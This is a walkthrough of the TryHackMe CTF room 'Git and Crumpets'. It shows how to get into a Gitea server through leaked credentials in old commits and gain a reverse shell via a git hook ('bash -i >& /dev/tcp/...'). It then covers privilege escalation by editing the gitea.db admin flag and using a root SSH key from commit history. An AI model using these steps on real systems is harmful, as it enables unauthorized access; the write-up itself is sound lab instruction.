# Git and Crumpets

Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets01.png" width="150" height="150">

LINK = [https://tryhackme.com/room/gitandcrumpets](https://tryhackme.com/room/gitandcrumpets)

### FYI
This writeup doesn't include any passwords/cracked hashes/flags

# Description
Our devs have been clamoring for some centralized version control, so the admin came through. Rumour has it that they included a few countermeasures...

# Steps

1: Scan the machine to discover how many ports are open
* ```nmap -sV <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets02.png" width="50%">

* If you access the target IP you will be redirected to one of the greatest song ever written :smile:

2: Analyzing the web response we can see that there is an URL for devs called ```git.git-and-crumpets.thm```
* ```curl <ip-virtual-machine>```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets03.png" width="50%">

* To access first you will need to add the URL to the hosts file 

* ```echo "<ip-virtual-machine> git.git-and-crumpets.thm" > /etc/hosts```

3: Access the URL will take you to the login and we can create an account ```http://git.git-and-crumpets.thm/user/sign_up```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets04.png" width="50%">

3: Explore the old commits from the repositories and you will find sensitive information that will allow you to login into the app with more privileges

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets05.png" width="50%">

4: Once you are logged in you will be able to access the settings of the repository, using the ```Git Hooks``` function you will be able to create a reverse shell

* Start listening in your attack machine ```nc -lvnp <choose-a-port>```

* Edit the first ```Git Hooks``` and add the following code ```bash -i >& /dev/tcp/<your-ip-address>/<port> 0>&1```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets06.png" width="50%">

* Now to trigger the hook go to the repository and make any random modification to any file and BOOM! you got the reverse shell

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets07.png" width="50%">

5: Find the user flag file (the flag will be in base64 so you can use ```cat user.txt | base64 -d```)

6: Exploring around the application directory ```/var/lib/gitea/``` you will find the database with the users, modify the permissions from our user to ```admin```

* ```sqlite3 /var/lib/gitea/data/gitea.db```
* ```UPDATE user SET is_admin=1 WHERE id=3;```

7: Go back to the webapp and you will discover a new repository

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/gitandcrumpets/gitandcrumpets08.png" width="50%">

* Explore the old commits from that repo and you will find the root ssh key
* Save that key in a file called id_rsa
* Grant the necessary permissions ```chmod 600 id_rsa```
* ```ssh -i id_rsa root@<ip-target-machine>```
* The passphrase for the key is around the files and commits 😉
* Find the root flag file (the flag will be in base64 so you can use ```cat root.txt | base64 -d```)

8: Get the root flag!! 😎
